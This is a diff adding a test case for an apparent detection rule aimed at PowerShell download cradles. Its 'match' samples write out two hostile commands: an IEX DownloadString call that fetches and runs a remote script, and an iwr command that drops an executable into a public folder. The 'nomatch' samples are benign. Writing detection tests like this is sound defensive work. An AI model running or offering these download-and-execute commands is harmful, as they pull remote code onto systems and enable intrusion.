@@ -1,0 +1,11 @@
+rule: PowerShell Download Cradle
+match:
+  - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    CommandLine: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')\""
+  - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    CommandLine: 'powershell iwr https://198.51.100.7/tool.exe -OutFile C:\Users\Public\tool.exe'
+nomatch:
+  - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    CommandLine: 'powershell Get-ChildItem C:\Users -Recurse'
+  - Image: 'C:\Windows\System32\curl.exe'
+    CommandLine: 'curl.exe https://example.com/file.zip -o file.zip'
